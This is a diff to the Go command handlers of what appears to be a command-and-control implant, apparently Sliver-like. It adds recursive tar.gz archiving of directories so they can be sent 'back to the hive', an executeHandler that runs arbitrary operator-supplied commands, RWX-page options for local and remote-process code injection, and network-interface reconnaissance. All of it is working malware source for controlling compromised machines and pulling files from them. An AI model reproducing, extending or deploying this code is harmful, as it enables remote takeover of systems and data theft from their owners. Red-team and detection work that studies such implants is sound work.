@@ -19,12 +19,15 @@ package handlers
 */
 
 import (
+	"archive/tar"
 	"bytes"
 	"compress/gzip"
 	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
+	"net"
+	"os/exec"
 
 	// {{if .Debug}}
 	"log"
@@ -244,6 +247,7 @@ func pwdHandler(data []byte, resp RPCResponse) {
 
 // Send a file back to the hive
 func downloadHandler(data []byte, resp RPCResponse) {
+	var rawData []byte
 	downloadReq := &pb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
@@ -254,7 +258,21 @@ func downloadHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	target, _ := filepath.Abs(downloadReq.Path)
-	rawData, err := ioutil.ReadFile(target)
+	fi, err := os.Stat(target)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("stat failed on %s: %v", target, err)
+		//{{end}}
+		resp([]byte{}, err)
+		return
+	}
+	if fi.IsDir() {
+		var dirData bytes.Buffer
+		err = compressDir(target, &dirData)
+		rawData = dirData.Bytes()
+	} else {
+		rawData, err = ioutil.ReadFile(target)
+	}
 
 	var download *pb.Download
 	if err == nil {
@@ -337,7 +355,7 @@ func taskHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	err = taskrunner.LocalTask(task.Data)
+	err = taskrunner.LocalTask(task.Data, task.RWXPages)
 	resp([]byte{}, err)
 }
 
@@ -350,8 +368,83 @@ func remoteTaskHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
+	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data, remoteTask.RWXPages)
 	resp([]byte{}, err)
+}
+
+func ifconfigHandler(_ []byte, resp RPCResponse) {
+	interfaces := ifconfig()
+	// {{if .Debug}}
+	log.Printf("network interfaces: %#v", interfaces)
+	// {{end}}
+	data, err := proto.Marshal(interfaces)
+	resp(data, err)
+}
+
+func ifconfig() *pb.Ifconfig {
+	netInterfaces, err := net.Interfaces()
+	if err != nil {
+		return nil
+	}
+
+	interfaces := &pb.Ifconfig{
+		NetInterfaces: []*pb.NetInterface{},
+	}
+	for _, iface := range netInterfaces {
+		netIface := &pb.NetInterface{
+			Index: int32(iface.Index),
+			Name:  iface.Name,
+		}
+		if iface.HardwareAddr != nil {
+			netIface.MAC = iface.HardwareAddr.String()
+		}
+		addresses, err := iface.Addrs()
+		if err == nil {
+			for _, address := range addresses {
+				netIface.IPAddresses = append(netIface.IPAddresses, address.String())
+			}
+		}
+		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
+	}
+	return interfaces
+}
+
+func executeHandler(data []byte, resp RPCResponse) {
+	var (
+		err error
+		cmd *exec.Cmd
+	)
+	execReq := &pb.ExecuteReq{}
+	err = proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	execResp := &pb.Execute{}
+	cmd = exec.Command(execReq.Path)
+	if len(execReq.Args) != 0 {
+		cmd.Args = execReq.Args
+	}
+	if execReq.Output {
+		res, err := cmd.Output()
+		//{{if .Debug}}
+		log.Println(string(res))
+		//{{end}}
+		if err != nil {
+			execResp.Error = err.Error()
+		} else {
+			execResp.Result = string(res)
+		}
+	} else {
+		err = cmd.Start()
+		if err != nil {
+			execResp.Error = err.Error()
+		}
+	}
+	data, err = proto.Marshal(execResp)
+	resp(data, err)
 }
 
 // ---------------- Data Encoders ----------------
@@ -372,4 +465,37 @@ func gzipRead(data []byte) ([]byte, error) {
 		return nil, err
 	}
 	return buf.Bytes(), nil
+}
+
+func compressDir(path string, buf io.Writer) error {
+	zipWriter := gzip.NewWriter(buf)
+	tarWriter := tar.NewWriter(zipWriter)
+
+	filepath.Walk(path, func(file string, fi os.FileInfo, err error) error {
+		header, err := tar.FileInfoHeader(fi, file)
+		if err != nil {
+			return err
+		}
+		header.Name = filepath.ToSlash(file)
+		if err := tarWriter.WriteHeader(header); err != nil {
+			return err
+		}
+		if !fi.IsDir() {
+			data, err := os.Open(file)
+			if err != nil {
+				return err
+			}
+			if _, err := io.Copy(tarWriter, data); err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+	if err := tarWriter.Close(); err != nil {
+		return err
+	}
+	if err := zipWriter.Close(); err != nil {
+		return err
+	}
+	return nil
 }
